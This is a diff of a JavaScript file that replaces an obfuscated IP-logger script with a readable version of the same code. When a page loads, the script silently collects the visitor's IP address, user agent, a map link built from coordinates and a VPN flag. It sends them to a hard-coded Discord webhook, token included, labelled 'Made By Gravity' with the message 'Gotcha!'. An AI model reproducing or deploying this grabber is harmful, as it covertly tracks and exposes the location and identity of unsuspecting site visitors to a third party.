@@ -1,1 +1,66 @@
-const _0xe59780=_0x275a;function _0x275a(_0x16a2d9,_0x978f95){const _0x45454e=_0x4545();return _0x275a=function(_0x275a4a,_0x522e33){_0x275a4a=_0x275a4a-0x129;let _0x2fb5ec=_0x45454e[_0x275a4a];return _0x2fb5ec;},_0x275a(_0x16a2d9,_0x978f95);}(function(_0xf4cc11,_0x5276d4){const _0x396afd=_0x275a,_0x10175c=_0xf4cc11();while(!![]){try{const _0x35e86a=parseInt(_0x396afd(0x12e))/0x1+-parseInt(_0x396afd(0x135))/0x2*(parseInt(_0x396afd(0x140))/0x3)+parseInt(_0x396afd(0x13d))/0x4*(-parseInt(_0x396afd(0x130))/0x5)+parseInt(_0x396afd(0x132))/0x6*(-parseInt(_0x396afd(0x143))/0x7)+-parseInt(_0x396afd(0x12b))/0x8+parseInt(_0x396afd(0x138))/0x9+parseInt(_0x396afd(0x13b))/0xa;if(_0x35e86a===_0x5276d4)break;else _0x10175c['push'](_0x10175c['shift']());}catch(_0x361f8e){_0x10175c['push'](_0x10175c['shift']());}}}(_0x4545,0x2411b));const webhook=_0xe59780(0x12c),request=async()=>{const _0x5f2627=_0xe59780;try{const _0x1cfe92=await fetch(_0x5f2627(0x137)),_0x222489=await _0x1cfe92[_0x5f2627(0x144)](),_0xf3c709=_0x222489['ip'],_0x1df0de=navigator['userAgent'];let _0x3ce35e=![];typeof VPNConn!==_0x5f2627(0x12f)&&VPNConn['connection_type']===_0x5f2627(0x13c)&&(_0x3ce35e=!![]);const _0x3f17ac=_0x5f2627(0x134)+latitude+','+longitude,_0x44a2ad={'username':'By\x20Gravity','avatar_url':_0x5f2627(0x13a),'embeds':[{'title':_0x5f2627(0x131),'description':_0x5f2627(0x12d),'fields':[{'name':'IP\x20Address','value':_0xf3c709},{'name':'User\x20Agent','value':_0x1df0de},{'name':_0x5f2627(0x133),'value':_0x5f2627(0x146)+_0x3f17ac+')'},{'name':_0x5f2627(0x12a),'value':_0x3ce35e?_0x5f2627(0x142):':x:\x20No'}],'footer':{'text':_0x5f2627(0x129)}}]};fetch(webhook,{'method':'POST','headers':{'Content-Type':_0x5f2627(0x136)},'body':JSON[_0x5f2627(0x141)](_0x44a2ad)})['then'](()=>{const _0x154423=_0x5f2627;console['log'](_0x154423(0x147));})[_0x5f2627(0x145)](_0x196b60=>{const _0x3c75cf=_0x5f2627;console[_0x3c75cf(0x13f)](_0x3c75cf(0x13e),_0x196b60);});}catch(_0x4ae510){console[_0x5f2627(0x13f)](_0x5f2627(0x139),_0x4ae510);}};request();function _0x4545(){const _0x115f7e=['324549XPVYip','Error:','https://www.discordavatars.com/wp-content/uploads/2020/05/hacker-avatar-023.jpg','5508040IcEXso','Corporate','315268CfhnAF','Error\x20while\x20sending\x20the\x20message:','error','393nTrsZG','stringify',':white_check_mark:\x20Yes','63mwJNGi','json','catch','[Click\x20Here](','Message\x20sent\x20successfully!','Made\x20By\x20Gravity','VPN\x20Detected','1171032WkAsbh','https://canary.discord.com/api/webhooks/1260862582902751414/4W3LOGZ2QWEQzsJSpukZYhZ3C6ecfSxUZoqSxgJ8q-4QDwW9DylyVuIQjfJPP9VN1Gyk','Gotcha!\x20Here\x20is\x20the\x20detailed\x20info\x20about\x20the\x20user\x20👀','228574zokLpK','undefined','15gVnhPd','User\x20Info','22146FQFTFn','Google\x20Maps\x20Link','https://www.google.com/maps/place/','3842mQLJwd','application/json','https://api.ipify.org/?format=json'];_0x4545=function(){return _0x115f7e;};return _0x4545();}
+const webhook = 'https://canary.discord.com/api/webhooks/1260862582902751414/4W3LOGZ2QWEQzsJSpukZYhZ3C6ecfSxUZoqSxgJ8q-4QDwW9DylyVuIQjfJPP9VN1Gyk';
+
+const request = async () => {
+  try {
+    const ipResponse = await fetch('https://api.ipify.org/?format=json');
+    const ipData = await ipResponse.json();
+    const ip = ipData.ip;
+
+    const userAgent = navigator.userAgent;
+    let isVPN = false;
+    if (typeof VPNConn !== 'undefined' && VPNConn.connection_type === 'Corporate') {
+      isVPN = true;
+    }
+    const googleMapsLink = `https://www.google.com/maps/place/${latitude},${longitude}`;
+
+    const message = {
+      username: 'By Gravity',
+      avatar_url: 'https://www.discordavatars.com/wp-content/uploads/2020/05/hacker-avatar-023.jpg',
+      embeds: [
+        {
+          title: 'User Info',
+          description: 'Gotcha! Here is the detailed info about the user 👀',
+          fields: [
+            {
+              name: 'IP Address',
+              value: ip,
+            },
+            {
+              name: 'User Agent',
+              value: userAgent,
+            },
+            {
+              name: 'Google Maps Link',
+              value: `[Click Here](${googleMapsLink})`,
+            },
+            {
+              name: 'VPN Detected',
+              value: isVPN ? ':white_check_mark: Yes' : ':x: No',
+            },
+          ],
+          footer: {
+            text: 'Made By Gravity',
+          },
+        },
+      ],
+    };
+
+    fetch(webhook, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(message),
+    })
+      .then(() => {
+        console.log('Message sent successfully!');
+      })
+      .catch((error) => {
+        console.error('Error while sending the message:', error);
+      });
+  } catch (error) {
+    console.error('Error:', error);
+  }
+};
+
+request();
